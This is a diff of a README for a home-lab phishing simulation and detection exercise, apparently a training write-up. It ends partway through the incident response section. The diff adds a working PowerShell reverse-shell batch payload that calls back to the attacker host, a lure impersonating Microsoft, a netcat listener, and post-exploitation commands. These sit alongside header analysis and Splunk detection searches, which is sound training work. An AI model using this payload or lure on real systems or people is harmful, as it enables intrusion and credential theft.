@@ -1,7 +1,6 @@
-# Email Phishing Simulation and Detection Lab
+#  Phishing Simulation and Detection Lab
 
 ![Security](https://img.shields.io/badge/Category-Cybersecurity-red)
-![Level](https://img.shields.io/badge/Level-Intermediate-orange)
 ![Lab](https://img.shields.io/badge/Environment-Home%20Lab-blue)
 ![Status](https://img.shields.io/badge/Status-Completed-green)
 ![SIEM](https://img.shields.io/badge/SIEM-Splunk-black)
@@ -9,7 +8,7 @@
 ![Firewall](https://img.shields.io/badge/Firewall-pfSense-blue)
 ![Server](https://img.shields.io/badge/Victim-Windows%20Server%202025-lightgrey)
 
------
+---
 
 ## Project Report
 A full technical write-up of this simulation is available as a PDF:
@@ -18,46 +17,19 @@ A full technical write-up of this simulation is available as a PDF:
 
 Covers: attack setup, detection methodology and forensic findings.
 
------
+----
 
-## Table of Contents
-* [Project Overview](#project-overview)
-* [Objectives](#objectives)
-* [Lab Architecture](#lab-architecture)
-* [Tools and Technologies](#tools-and-technologies)
-* [Lab Environment](#lab-environment)
-* [Installation and Setup](#installation-and-setup)
-* [Configuring pfSense in VirtualBox](#configuring-pfsense-in-virtualbox)
-* [Configuring pfSense Network Segmentation](#configuring-pfsense-network-segmentation)
-* [Configuring pfSense Firewall Rules](#configuring-pfsense-firewall-rules)
-* [Installing MailHog on Kali Linux](#installing-mailhog-on-kali-linux)
-* [Installing GoPhish on Kali Linux](#installing-gophish-on-kali-linux)
-* [Installing Sysmon on windows Server 2025](#installing-sysmon-on-windows-server-2025)
-* [Installing Splunk on Kali Linux](#installing-splunk-on-kali-linux)
-* [Installing Splunk Universal Forwarder on Windows Server 2025](#installing-splunk-universal-forwarder-on-windows-server-2025)
-* [Phase 1: Simulate](#phase-1-simulate)
-* [Phase 2: Detect](#phase-2-detect)
-* [Phase 3: Respond](#phase-3-respond)
-* [Screenshots](#screenshots)
-* [Lessons Learned](#lessons-learned)
-* [Indicators of Compromise (IOCs)](#indicators-of-compromise-iocs)
-* [Incident Timeline](#incident-timeline)
-* [Difficulties and Troubleshooting](#difficulties-and-troubleshooting)
-* [Skills Demonstrated](#skills-demonstrated)
-* [Legal Disclaimer](#legal-disclaimer)
-* [References](#references)
+##  Project Overview
+
+A hands-on cybersecurity home lab project that simulates a real-world phishing attack from end to end. This project covers the full attack lifecycle — from crafting and delivering a phishing email with a malicious attachment, to analyzing email headers, detecting malicious activity using a SIEM, gaining remote access via a reverse shell, and performing structured incident response. A pfSense firewall segments the network between the attacker and victim machines, mirroring how enterprise networks are protected. Built entirely on an isolated internal network using VirtualBox, this lab mirrors how real Security Operations Centers (SOCs) detect and respond to phishing threats in enterprise environments.
 
 ---
 
-## Project Overview
-
-A hands-on cybersecurity home lab project that simulates a real-world phishing attack from end to end. This project covers the full attack lifecycle  from crafting and delivering a phishing email, to analyzing email headers, detecting malicious activity using a SIEM, and performing structured incident response. A pfSense firewall segments the network between the attacker and victim machines, mirroring how enterprise networks are protected. Built entirely on an isolated internal network using VirtualBox, this lab mirrors how real Security Operations Centers (SOCs) detect and respond to phishing threats in enterprise environments.
-
------
-
-## Objectives
+##  Objectives
 
 - Simulate a phishing campaign using GoPhish and MailHog on an isolated internal network
+- Deliver a malicious batch file attachment via phishing email to gain remote access
+- Establish a reverse shell from Windows Server back to Kali Linux
 - Segment the lab network using pfSense with WAN, LAN, and OPT1 interfaces
 - Block and monitor phishing traffic at the firewall level using pfSense rules
 - Analyze phishing email headers using MXToolbox to identify SPF, DKIM, and DMARC failures
@@ -67,7 +39,7 @@ A hands-on cybersecurity home lab project that simulates a real-world phishing a
 - Perform structured incident response using the PICERL framework
 - Document Indicators of Compromise (IOCs) and produce a formal incident report
 
------
+---
 
 ## Lab Architecture
 
@@ -75,96 +47,93 @@ A hands-on cybersecurity home lab project that simulates a real-world phishing a
 ┌──────────────────────────────────────────────────────────────────┐
 │                   VirtualBox Lab Environment                     │
 │                                                                  │
-│   ┌──────────────────────────────────────────────────────────┐   │
-│   │                     pfSense Firewall                     │   │
-│   │                                                          │   │
-│   │    WAN                LAN                  OPT1          │   │
-│   │                  192.168.2.1          192.168.1.1        │   │
-│   └──────┬───────────────┬───────────────────┬────-──────────┘   │
-│          │               │                   │                   │
-│     [Internet]    ┌──────┴──────┐     ┌──────┴──────┐            │
-│                   │ KALI LINUX  │     │ WIN SERVER  │            │
-│                   │192.168.2.5  │     │192.168.1.1  │            │
-│                   │ (Attacker)  │     │  (Victim)   │            │
-│                   │             │     │             │            │
-│                   │ GoPhish     │     │ Sysmon      │            │
-│                   │ MailHog     │     │ Splunk Fwd  │            │
-│                   │ Wireshark   │     │             │            │
-│                   │ Splunk SIEM │     │             │            │
-│                   └─────────────┘     └─────────────┘            │
+│         ┌────────────────────────────────────────┐              │
+│         │            pfSense Firewall             │              │
+│         │                                         │              │
+│         │  WAN        OPT1             LAN         │              │
+│         │  DHCP   192.168.2.1      192.168.1.2    │              │
+│         └────┬──────────┬──────────────┬──────────┘              │
+│              │          │              │                          │
+│         [Internet]  ┌───┴──────┐  ┌───┴──────────┐              │
+│         Simulated   │KALI LINUX│  │ WIN SERVER   │              │
+│                     │192.168.2.5│  │ 192.168.1.1  │              │
+│                     │(Attacker)│  │  (Victim)    │              │
+│                     │          │  │              │              │
+│                     │ GoPhish  │  │ Sysmon       │              │
+│                     │ MailHog  │  │ Splunk Fwd   │              │
+│                     │ Wireshark│  │              │              │
+│                     │ Splunk   │  │              │              │
+│                     │ Netcat   │  │              │              │
+│                     └──────────┘  └──────────────┘              │
 │                                                                  │
-│   Attack Flow:                                                   │
-│   Kali ──▶ pfSense (OPT1→LAN rules) ──▶ Windows Victim          │
+│  Attack Flow:                                                    │
+│  Kali (OPT1) ──▶ pfSense ──▶ Windows Server (LAN)              │
 │                                                                  │
-│   Detection Flow:                                                │
-│   pfSense Logs + Sysmon ──▶ Splunk ──▶ Alert                    │
-│   Wireshark ──▶ HTTP Stream ──▶ Credentials Captured            │
-│   MXToolbox ──▶ Header Analysis ──▶ SPF DKIM DMARC Failures     │
+│  Reverse Shell Flow:                                             │
+│  Windows Server ──▶ pfSense ──▶ Kali port 4444                 │
+│                                                                  │
+│  Detection Flow:                                                 │
+│  Sysmon ──▶ Splunk Forwarder ──▶ Splunk SIEM ──▶ Alert         │
+│  Wireshark ──▶ HTTP Stream ──▶ Credentials Captured            │
+│  MXToolbox ──▶ Header Analysis ──▶ SPF DKIM DMARC Failures     │
+│  pfSense ──▶ Firewall Logs ──▶ Traffic Evidence                │
 │                                                                  │
 │                                                                  │
 └──────────────────────────────────────────────────────────────────┘
 ```
 
------
+---
 
-## Tools and Technologies
+##  Tools and Technologies
 
-|Tool                      |Purpose                                            |
-|--------------------------|---------------------------------------------------|
-|pfSense                   |Network segmentation and firewall traffic control  |
-|GoPhish                   |Phishing campaign simulation                       |
-|MailHog                   |Local fake SMTP mail server                        |
-|Splunk 10.2.2             |SIEM log collection and analysis                   |
-|Splunk Universal Forwarder|Ships Windows logs to Splunk                       |
-|Sysmon                    |Windows process and network event logging          |
-|Wireshark                 |Network traffic capture and analysis               |
-|MXToolbox                 |Email header analysis and SPF DKIM DMARC inspection|
-|VirtualBox                |Isolated lab environment                           |
+| Tool | Purpose |
+|---|---|
+| pfSense | Network segmentation and firewall traffic control |
+| GoPhish | Phishing campaign simulation and attachment delivery |
+| MailHog | Local fake SMTP mail server |
+| Netcat | Reverse shell listener on Kali |
+| Splunk 10.2.2 | SIEM log collection and analysis |
+| Splunk Universal Forwarder | Ships Windows logs to Splunk |
+| Sysmon | Windows process and network event logging |
+| Wireshark | Network traffic capture and analysis |
+| MXToolbox | Email header analysis and SPF DKIM DMARC inspection |
+| VirtualBox | Isolated lab environment |
 
------
+---
 
-## Lab Environment
+##  Lab Environment
 
-|Machine       |OS                 |IP Address               |Interface     |Role               |
-|--------------|-------------------|-------------------------|--------------|-------------------|
-|pfSense       |pfSense CE         |192.168.2.1 / 192.168.1.1|WAN, LAN, OPT1|Firewall and router|
-|Kali Linux    |Kali Linux         |192.168.2.5              |OPT1          |Attacker           |
-|Windows Server|Windows Server 2025|192.168.1.1              |LAN           |Victim             |
+| Machine | OS | IP Address | Interface | Role |
+|---|---|---|---|---|
+| pfSense | pfSense CE | OPT1: 192.168.2.1 / LAN: 192.168.1.2 | WAN, OPT1, LAN | Firewall and router |
+| Kali Linux | Kali Linux | 192.168.2.5 | OPT1 | Attacker |
+| Windows Server | Windows Server 2025 | 192.168.1.1 | LAN | Victim |
 
-**Network:** VirtualBox with pfSense routing between segments fully isolated, no internet required
+**Network:** VirtualBox with pfSense routing between OPT1 (attacker) and LAN (victim) — fully isolated
 
------
+---
 
-## Installation and Setup
+##  Installation and Setup
 
 ### Configuring pfSense in VirtualBox
 
-pfSense acts as the gateway and firewall between the attacker and victim networks.
-
-**Step 1: Configure pfSense VM with 3 network adapters in VirtualBox:**
+**Step 1 — Configure pfSense VM with 3 network adapters:**
 
 ```
-Adapter 1 (WAN):  
-Adapter 2 (LAN):  Internal Adapter 
-Adapter 3 (OPT1): Internal Adapter 
+Adapter 1 (WAN):  NAT
+Adapter 2 (OPT1): Host-Only Adapter — vboxnet0  (Kali network)
+Adapter 3 (LAN):  Host-Only Adapter — vboxnet1  (Windows network)
 ```
 
-**Step 2: Boot pfSense and assign interfaces:**
+**Step 2 — Boot pfSense and assign interfaces:**
 
 ```
-WAN  → em0
-LAN  → em1 (victim network)
-OPT1 → em2 (attacker network)
+WAN  → em0  (NAT)
+OPT1 → em1  (192.168.2.1 — attacker network)
+LAN  → em2  (192.168.1.2 — victim network)
 ```
 
-**Step 3: Set static IPs on each interface:**
-
-```
-LAN  IP: 192.168.1.1/24
-OPT1 IP: 192.168.2.1/24
-```
-
-**Step 4: Access pfSense web UI from Kali:**
+**Step 3 — Access pfSense web UI from Kali:**
 
 ```
 http://192.168.2.1
@@ -172,32 +141,11 @@ Username: admin
 Password: pfsense
 ```
 
------
-
-### Configuring pfSense Network Segmentation
-
-**Step 1: Enable OPT1 interface:**
-
-```
-Interfaces > OPT1 > Enable Interface
-IPv4 Configuration: Static
-IPv4 Address: 192.168.2.1/24
-Save and Apply
-```
-
-**Step 2: Configure for LAN (victim network):**
-
-```
-Services r > LAN
-Range: 192.168.1.0/24
-Save
-```
-
------
+---
 
 ### Configuring pfSense Firewall Rules
 
-**Rule 1: Allow OPT1 (Kali) to reach LAN (Windows) on port 80:**
+**Rule 1 — Allow OPT1 (Kali) to reach LAN (Windows) on port 80:**
 
 ```
 Firewall > Rules > OPT1 > Add Rule
@@ -211,21 +159,7 @@ Description:      Allow GoPhish landing page to victim
 Save and Apply
 ```
 
-**Rule 2: Allow LAN (Windows) to reach Splunk on Kali:**
-
-```
-Firewall > Rules > LAN > Add Rule
-Action:           Pass
-Interface:        LAN
-Protocol:         TCP
-Source:           192.168.1.1
-Destination:      192.168.2.5
-Destination Port: 9997
-Description:      Allow Splunk Forwarder to SIEM
-Save and Apply
-```
-
-**Rule 3: Allow LAN to reach MailHog on Kali:**
+**Rule 2 — Allow LAN (Windows) to reach MailHog on Kali:**
 
 ```
 Firewall > Rules > LAN > Add Rule
@@ -239,7 +173,49 @@ Description:      Allow victim to access MailHog
 Save and Apply
 ```
 
-**Rule 4: Block all other LAN to OPT1 traffic:**
+**Rule 3 — Allow LAN (Windows) to download file from Kali:**
+
+```
+Firewall > Rules > LAN > Add Rule
+Action:           Pass
+Interface:        LAN
+Protocol:         TCP
+Source:           192.168.1.1
+Destination:      192.168.2.5
+Destination Port: 8080
+Description:      Allow file download from Kali
+Save and Apply
+```
+
+**Rule 4 — Allow reverse shell from Windows to Kali on port 4444:**
+
+```
+Firewall > Rules > LAN > Add Rule
+Action:           Pass
+Interface:        LAN
+Protocol:         TCP
+Source:           192.168.1.1
+Destination:      192.168.2.5
+Destination Port: 4444
+Description:      Allow reverse shell callback
+Save and Apply
+```
+
+**Rule 5 — Allow Splunk Forwarder from Windows to Kali:**
+
+```
+Firewall > Rules > LAN > Add Rule
+Action:           Pass
+Interface:        LAN
+Protocol:         TCP
+Source:           192.168.1.1
+Destination:      192.168.2.5
+Destination Port: 9997
+Description:      Allow Splunk Forwarder to SIEM
+Save and Apply
+```
+
+**Rule 6 — Block all other LAN to OPT1 traffic:**
 
 ```
 Firewall > Rules > LAN > Add Rule
@@ -252,60 +228,54 @@ Description:      Default deny LAN to OPT1
 Save and Apply
 ```
 
-**Enable logging on all rules:**
-
-```
-Edit each rule > Check Log packets matched by this rule > Save
-```
-
------
+---
 
 ### Installing MailHog on Kali Linux
 
-**Step 1: Install Go:**
+**Step 1 — Install Go:**
 
 ```bash
 sudo apt update
 sudo apt install golang -y
 ```
 
-**Step 2: Install MailHog:**
+**Step 2 — Install MailHog:**
 
 ```bash
 go install github.com/mailhog/MailHog@latest
 ```
 
-**Step 3: Start MailHog:**
+**Step 3 — Start MailHog:**
 
 ```bash
 ~/go/bin/MailHog
 ```
 
-**Step 4: Verify output:**
+**Step 4 — Verify output:**
 
 ```
 [SMTP] LISTENING on 0.0.0.0:1025
 [APIv1] LISTENING on 0.0.0.0:8025
 ```
 
-**Step 5: Access MailHog from Windows VM:**
+**Step 5 — Access MailHog from Windows Server:**
 
 ```
 http://192.168.2.5:8025
 ```
 
------
+---
 
 ### Installing GoPhish on Kali Linux
 
-**Step 1: Download GoPhish:**
+**Step 1 — Download GoPhish:**
 
 ```bash
 cd ~/Desktop
 wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
 ```
 
-**Step 2: Unzip and prepare:**
+**Step 2 — Unzip and prepare:**
 
 ```bash
 unzip gophish-v0.12.1-linux-64bit.zip -d gophish
@@ -313,19 +283,13 @@ cd gophish
 chmod +x gophish
 ```
 
-**Step 3: Run GoPhish:**
+**Step 3 — Run GoPhish:**
 
 ```bash
 sudo ./gophish
 ```
 
-**Step 4: Note auto-generated password from terminal:**
-
-```
-msg="Please login with the username admin and password XXXXXXXXX"
-```
-
-**Step 5: Open GoPhish dashboard on Kali:**
+**Step 4 — Open GoPhish dashboard:**
 
 ```
 https://127.0.0.1:3333
@@ -333,68 +297,119 @@ Username: admin
 Password: from terminal output
 ```
 
------
+---
+
+### Creating the Malicious Batch File
+
+The malicious batch file establishes a reverse shell from Windows Server back to Kali.
+
+**Step 1 — Open Notepad as Administrator on Windows Server**
+
+**Step 2 — Type the following exactly:**
+
+```batch
+@echo off
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('192.168.2.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($sb),0,([text.encoding]::ASCII).GetBytes($sb).Length)};$c.Close()"
+```
+
+**Step 3 — Save the file:**
+
+```
+File > Save As
+File name:    update.bat
+Save as type: All Files
+Location:     C:\Users\Administrator\Downloads
+```
+
+**What the payload does:**
+
+```
+-NoP          → No PowerShell profile loaded
+-NonI         → Non interactive mode
+-W Hidden     → Hidden window — victim sees nothing
+-Exec Bypass  → Bypasses execution policy
+TCPClient     → Connects back to Kali on port 4444
+iex $d        → Executes commands sent from Kali
+```
+
+---
 
 ### Installing Sysmon on Windows Server 2025
 
-**Step 1: Download Sysmon from Microsoft Sysinternals**
+**Step 1 — Download Sysmon from Microsoft Sysinternals**
 
-**Step 2: Open PowerShell as Administrator:**
+**Step 2 — Open PowerShell as Administrator:**
 
 ```powershell
 cd C:\sysmon
 .\sysmon64.exe -accepteula -i
 ```
 
-**Step 3: Verify Sysmon is running:**
+**Step 3 — Apply network monitoring config:**
+
+Create `C:\sysmon\sysmonconfig.xml`:
+
+```xml
+<Sysmon schemaversion="4.82">
+  <EventFiltering>
+    <RuleGroup name="" groupRelation="or">
+      <NetworkConnect onmatch="exclude">
+      </NetworkConnect>
+    </RuleGroup>
+    <RuleGroup name="" groupRelation="or">
+      <ProcessCreate onmatch="exclude">
+      </ProcessCreate>
+    </RuleGroup>
+    <RuleGroup name="" groupRelation="or">
+      <DnsQuery onmatch="exclude">
+      </DnsQuery>
+    </RuleGroup>
+  </EventFiltering>
+</Sysmon>
+```
+
+Apply config:
 
 ```powershell
-Get-Service sysmon64
+.\sysmon64.exe -c C:\sysmon\sysmonconfig.xml
+Restart-Service sysmon64
 ```
 
-Expected output:
-
-```
-Status   Name
--------  ----
-Running  Sysmon64
-```
-
------
+---
 
 ### Installing Splunk on Kali Linux
 
-**Step 1: Install Splunk:**
+**Step 1 — Install Splunk:**
 
 ```bash
 sudo dpkg -i splunk.deb
 sudo /opt/splunk/bin/splunk start --accept-license
 ```
 
-**Step 2: Access Splunk:**
+**Step 2 — Access Splunk:**
 
 ```
 http://127.0.0.1:8000
 ```
 
-**Step 3: Configure receiving port 9997:**
+**Step 3 — Configure receiving port 9997:**
 
 ```
-Settings > Forwarding and Receiving > Configure Receiving > New Receiving Port > 9997
+Settings > Forwarding and Receiving > Configure Receiving > 9997
 ```
 
------
+---
 
 ### Installing Splunk Universal Forwarder on Windows Server 2025
 
-**Step 1: Install with receiving indexer:**
+**Step 1 — Install with receiving indexer:**
 
 ```
 Receiving Indexer: 192.168.2.5
 Port:              9997
 ```
 
-**Step 2: Create inputs.conf:**
+**Step 2 — Create inputs.conf:**
 
 ```
 C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf
@@ -402,33 +417,30 @@ C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf
 
 ```ini
 [WinEventLog://Microsoft-Windows-Sysmon/Operational]
-index = sysmon_index
+index = main
 sourcetype = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
 disabled = false
-renderXml = true
 
 [WinEventLog://Security]
-index = windws_index
-disabled = 0
+index = main
+sourcetype = WinEventLog:Security
+disabled = false
 
 [WinEventLog://Application]
-index = widws_index
-disabled = 0
-
-[WinEventLog://System]
-index = widws_index
-disabled = 0
+index = main
+sourcetype = WinEventLog:Application
+disabled = false
 ```
 
-**Step 3: Restart forwarder:**
+**Step 3 — Restart forwarder:**
 
 ```powershell
 Restart-Service SplunkForwarder
 ```
 
------
+---
 
-## Phase 1: Simulate
+## Phase 1 — Simulate
 
 ### GoPhish Configuration
 
@@ -436,7 +448,7 @@ Restart-Service SplunkForwarder
 
 ```
 Name:  MailHog
-From:  itsupport@domain.com
+From:  IT Support <it@lab.local>
 Host:  127.0.0.1:1025
 ```
 
@@ -445,24 +457,27 @@ Host:  127.0.0.1:1025
 ```
 Name:        Lab Targets
 First Name:  Elvis
-Last Name:   (victim name)
 Email:       servercis@lab.com
 ```
 
 **Email Template:**
 
 ```
-Name:             Password Reset
-Envelope Sender:  itsupport@domain.com
-Subject:          Urgent - Your Password expires today
+Name:             Malicious Update
+Envelope Sender:  Microsoft@update.com
+Subject:          Urgent-Update
 ```
 
 ```html
-<p>Dear Elvis,</p>
-<p>Your account password expires in 24 hours.
-Click below to reset it immediately:</p>
-<p><a href="{{.URL}}">Reset My Password</a></p>
-<p>IT Support Team</p>
+<p>Dear Employee,</p>
+<p>A critical security update is required
+for your account.</p>
+<p>Please download and run the update
+tool below immediately:</p>
+<p><a href="http://192.168.2.5:8080/update.bat">
+Download Security Update
+</a></p>
+<p>Microsoft Support Team</p>
 ```
 
 **Landing Page:**
@@ -491,12 +506,13 @@ Redirect To:            https://google.com
 **Campaign Settings:**
 
 ```
-Name:            Phishing Detection Test
-Email Template:  Password Reset
+Name:            Phishing Attack
+Email Template:  Malicious Update
 Landing Page:    Fake Office 365 Login
 URL:             http://192.168.2.5
 Sending Profile: MailHog
 Groups:          Lab Targets
+Attachment:      update.bat
 ```
 
 ### Phase 1 Results
@@ -506,365 +522,406 @@ Email Sent          YES
 Email Opened        YES
 Link Clicked        YES
 Credentials         CAPTURED
+Attachment          DOWNLOADED AND EXECUTED
 ```
 
-Phishing link generated by GoPhish:
+---
 
-```
-http://192.168.2.5/?rid=XXXXXXX
-```
+## Phase 2 — Reverse Shell
 
-The rid parameter is a unique tracking ID GoPhish assigns per victim to track clicks and credential submissions.
+### Starting the Listener on Kali
 
------
+**Step 1 — Start Netcat listener on Kali:**
 
-## Phase 2: Detect
-
-### 2A — Email Header Analysis Using MXToolbox
-
-After receiving the phishing email in MailHog, the raw email headers were extracted and analyzed using MXToolbox Header Analyzer at mxtoolbox.com/EmailHeaders.aspx
-
-**Headers extracted from the phishing email:**
-
-```
-Content-Transfer-Encoding: quoted-printable
-Content-Type: text/html; charset=UTF-8
-Date: Fri, 22 May 2026 01:04:25 +0100
-From: itsupport@domain.com
-Message-Id: <177940826506034983...@kali>
-Mime-Version: 1.0
-Received: from kali by mailhog.example (MailHog)
-Return-Path: <it@lab.local>
-Subject: Urgent - Your Password expires today
-To: "server cis" <servercis@lab.com>
-X-Mailer: gophish
+```bash
+nc -lvnp 4444
 ```
 
-**Key findings from header analysis:**
-
-|Header Field|Value                       |Finding                                              |
-|------------|----------------------------|-----------------------------------------------------|
-|From        |itsupport@domain.com        |Spoofed sender address                               |
-|Return-Path |it@lab.local                |Mismatch with From field — red flag                  |
-|X-Mailer    |gophish                     |Identifies GoPhish as sending tool                   |
-|Received    |from kali by mailhog.example|Reveals true sending server                          |
-|Relay Delay |0 seconds                   |Email sent and received instantly — no legitimate MTA|
-
-**SPF, DKIM and DMARC Analysis Results:**
-
-|Check             |Result|Meaning                            |
-|------------------|------|-----------------------------------|
-|DMARC Compliant   |FAIL  |Email fails DMARC policy           |
-|SPF Alignment     |FAIL  |Sender IP not authorized           |
-|SPF Authenticated |FAIL  |No valid SPF record for lab.local  |
-|DKIM Alignment    |FAIL  |No DKIM signature present          |
-|DKIM Authenticated|FAIL  |No DKIM-Signature header found     |
-|DMARC Policy      |None  |Policy set to none — no enforcement|
-
-**DMARC Record found for domain.com:**
-
+Output:
 ```
-v=DMARC1; p=none; pct=100; sp=none; adkim=r; aspf=r; fo=1
+Listening on any 4444
 ```
 
-Policy is set to none meaning emails that fail DMARC are not rejected or quarantined — a common misconfiguration in real environments.
+**Step 2 — Victim executes update.bat on Windows Server:**
 
-**SPF finding:**
+```cmd
+cd C:\Users\Administrator\Downloads
+update.bat
+```
+
+**Step 3 — Reverse shell connects back to Kali:**
+
+```
+connect to 192.168.2.5 from 192.168.1.1 56118
+PS C:\Users\Administrator>
+```
+
+**Step 4 — Attacker now has full control of Windows Server:**
+
+```powershell
+whoami
+ipconfig
+net user
+tasklist
+dir C:\Users\Administrator\Desktop
+```
+
+### What the Reverse Shell Demonstrated
+
+```
+Attacker sent phishing email
+      ↓
+Victim downloaded malicious attachment
+      ↓
+Victim executed update.bat
+      ↓
+PowerShell ran silently and hidden
+      ↓
+Windows Server connected back to Kali port 4444
+      ↓
+Attacker gained full remote shell access
+      ↓
+Can steal data, move laterally, install malware
+```
+
+---
+
+## Phase 3 — Detect
+
+### 3A — Email Header Analysis Using MXToolbox
+
+After receiving the phishing email in MailHog on Windows Server, the raw email headers were extracted and analyzed using MXToolbox Header Analyzer at mxtoolbox.com/EmailHeaders.aspx
+
+**Headers Found:**
+
+| Header Name | Header Value | Finding |
+|---|---|---|
+| From | Microsoft@update.com | Spoofed Microsoft domain |
+| Return-Path | it@lab.local | Does not match From — spoofing confirmed |
+| Subject | Urgent-Update | Urgency tactic to pressure victim |
+| To | server cis servercis@lab.com | Target victim |
+| X-Mailer | gophish | Phishing tool identified |
+| Received | from kali by mailhog.example | True sending server revealed |
+| Date | Sat 23 May 2026 20:19:16 +0100 | Timestamp of attack |
+| Message-Id | 177956...@kali | Originated from Kali machine |
+| Content-Type | multipart/mixed | Email contains attachment |
+| Link in body | http://192.168.2.5:8080/update.bat | Malicious file download link |
+
+**SPF DKIM and DMARC Analysis Results:**
+
+| Check | Result | Meaning |
+|---|---|---|
+| DMARC Compliant | FAIL — No DMARC Record Found | Domain update.com has no DMARC policy |
+| SPF Alignment | FAIL | Sender IP not authorized |
+| SPF Authenticated | FAIL | No name servers found for lab.local |
+| DKIM Alignment | FAIL | No DKIM signature present |
+| DKIM Authenticated | FAIL | No DKIM-Signature header found |
+
+**DMARC Finding:**
+
+```
+Domain:       dmarc:update.com
+Result:       No DMARC Record found
+DNS Provider: Amazon Route 53
+```
+
+No DMARC record means there is no policy to reject or quarantine spoofed emails from this domain — making it trivial for attackers to impersonate Microsoft@update.com.
+
+**SPF Finding:**
 
 ```
 spf:lab.local
 Sorry, we could not find any name servers for lab.local
 ```
 
-lab.local is an internal domain with no public DNS records — confirming this is a spoofed internal sender with no legitimate SPF record.
+lab.local is an internal domain with no public DNS — confirming the Return-Path is a spoofed internal address.
 
-**Conclusion from header analysis:**
+**DKIM Finding:**
 
-This email is a phishing email. The From address is spoofed, the Return-Path does not match, there is no DKIM signature, SPF fails, and the X-Mailer header reveals GoPhish was used to send it. In a real environment this email would be quarantined or rejected if DMARC policy was set to quarantine or reject.
+```
+Dkim Signature Error: No DKIM-Signature header found
+Dkim Signature Error: There must be at least one aligned 
+DKIM-Signature for the message to be considered aligned
+```
 
------
+No cryptographic signature on the email — any mail security gateway should flag this immediately.
 
-### 2B: pfSense Firewall Detection
+**Relay Information:**
 
-During the phishing campaign pfSense logs all traffic between Kali and Windows.
+```
+Hop:   1
+From:  kali
+By:    mailhog.example
+Time:  5/23/2026 7:19:16 PM UTC
+Delay: 0 seconds
+```
 
-**View live firewall logs:**
+Email travelled from kali directly to mailhog.example with zero delay — no legitimate mail transfer agent was involved.
+
+**Conclusion:**
+
+This email is confirmed phishing. The From address Microsoft@update.com is spoofed, the Return-Path it@lab.local does not match, there is no DKIM signature, no SPF record, no DMARC policy, and the X-Mailer header reveals GoPhish was used. The email body contains a direct link to a malicious batch file at http://192.168.2.5:8080/update.bat.
+
+---
+
+### 3B — pfSense Firewall Detection
 
 ```
 Status > System Logs > Firewall
 ```
 
-|Log Entry                 |What It Means                      |
-|--------------------------|-----------------------------------|
-|Pass OPT1 to LAN port 80  |Victim clicked phishing link       |
-|Pass LAN to OPT1 port 9997|Splunk forwarder sending logs      |
-|Block LAN to OPT1 any     |Blocked unexpected outbound traffic|
+| Log Entry | What It Means |
+|---|---|
+| Pass LAN to OPT1 port 80 | Victim clicked phishing link |
+| Pass LAN to OPT1 port 8080 | Victim downloaded malicious update.bat |
+| Pass LAN to OPT1 port 4444 | Reverse shell connected to Kali |
+| Pass LAN to OPT1 port 9997 | Splunk forwarder sending logs |
 
------
+---
 
-### 2C: Wireshark Detection
-
-Start Wireshark on Kali:
+### 3C — Wireshark Detection
 
 ```bash
 sudo wireshark
 ```
 
-Apply filter:
-
+Filter:
 ```
-http or smtp
+http or smtp or tcp.port==4444
 ```
 
-After victim clicks phishing link:
-
+Find POST request:
 ```
-Find POST request > Right click > Follow > HTTP Stream
+Right click > Follow > HTTP Stream
 ```
 
 Credentials visible in plain text:
-
 ```
 email=victim%40company.com&password=Password123
 ```
 
------
+---
 
-### 2D: Splunk Detection
+### 3D — Splunk Detection
 
-**SPL Search 1 — All Sysmon Events Clean View:**
-
-```
-index=main sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
-| rex field=_raw "EventID>(?<EventID>\d+)<"
-| rex field=_raw "Image>(?<Image>[^<]+)<"
-| rex field=_raw "DestinationIp>(?<DestIP>[^<]+)<"
-| rex field=_raw "User>(?<User>[^<]+)<"
-| table _time, EventID, Image, DestIP, User
-```
-
-**SPL Search 2: Detect Failed Logins After Phishing:**
+**Search 1 — See all logs from Windows Server:**
 
 ```
-index=main sourcetype="WinEventLog:Security"
-EventCode=4625
-| table _time, Computer, Account_Name, Failure_Reason, IpAddress
+index=main host="192.168.1.1"
 ```
 
+**Search 2 — Detect PowerShell execution:**
 
-## Phase 3: Respond
+```
+index=main EventID=1 "powershell"
+```
+
+**Search 3 — Detect reverse shell network connection:**
+
+```
+index=main EventID=3 "192.168.2.5"
+```
+
+**Search 4 — Detect failed logins:**
+
+```
+index=main EventCode=4625 Logon_Type=3
+```
+
+**Search 5 — Detect network logon from attacker:**
+
+```
+index=main EventCode=4624 Logon_Type=3 Source_Network_Address="192.168.2.5"
+```
+
+**Search 6 — See last 5 minutes of activity:**
+
+```
+index=main earliest=-5m
+```
+
+### Sysmon Event ID Reference
+
+| EventID | Meaning |
+|---|---|
+| 1 | Process Created |
+| 3 | Network Connection |
+| 5 | Process Terminated |
+| 7 | Image or DLL Loaded |
+| 11 | File Created |
+| 22 | DNS Query |
+
+---
+
+## Phase 4 — Respond
 
 ### PICERL Incident Response Framework
 
 #### Preparation
 
-- VirtualBox lab built with pfSense firewall separating attacker and victim networks
-- pfSense configured with WAN, LAN, and OPT1 interfaces and firewall rules with logging enabled
-- GoPhish and MailHog installed and configured on Kali Linux
-- Sysmon installed on Windows Server 2025 with event logging enabled
-- Splunk Universal Forwarder configured to ship logs to Splunk SIEM on Kali
-- Wireshark ready to capture live network traffic on Kali
-- MXToolbox identified as the tool for email header analysis
-- Splunk detection searches written and tested before simulation
+- VirtualBox lab built with pfSense separating OPT1 (attacker) and LAN (victim)
+- GoPhish and MailHog configured on Kali Linux at 192.168.2.5
+- Malicious batch file created to establish reverse shell on port 4444
+- Netcat listener configured on Kali to catch reverse shell connections
+- Sysmon installed and configured with network monitoring on Windows Server
+- Splunk Universal Forwarder shipping logs to Splunk on Kali
+- Wireshark and MXToolbox ready for traffic and header analysis
 
 #### Identification
 
-The following evidence confirmed a phishing attack occurred:
-
-- GoPhish dashboard showed email sent, opened, link clicked, and credentials submitted
-- MXToolbox header analysis confirmed SPF fail, DKIM fail, DMARC fail, and X-Mailer showing gophish
